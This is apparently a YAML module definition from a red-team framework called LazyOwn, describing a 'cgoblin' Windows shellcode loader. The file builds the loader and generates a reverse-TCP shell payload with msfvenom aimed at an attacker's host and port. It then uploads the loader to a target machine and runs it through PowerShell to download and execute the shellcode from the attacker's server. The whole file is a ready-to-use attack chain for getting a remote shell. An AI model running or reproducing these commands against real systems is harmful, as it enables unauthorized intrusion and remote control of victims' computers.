name: cgoblin_windows
description: >
  cgoblin shellcode in windows and windows from an url
author: "LazyOwn RedTeam"
version: "1.0"
enabled: true
params:
  - name: lhost
    type: string
    required: true
    description: lhost target.
  - name: lport
    type: string
    required: true
    description: lport to operate.
tool:
  name: cgoblin_windows
  repo_url: https://github.com/grisuno/cgoblin.git
  install_path: external/.exploit/cgoblin
  install_command: GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -o loader_windows.exe
  execute_command: msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o ../../../sessions/shellcode_windows.txt ; cp loader_windows.exe ../../../sessions/
  upload_file: no_priv sessions/loader_windows.exe
  remote_command: no_priv powershell .\loader_windows.exe -url http://{lhost}/shellcode_windows.txt
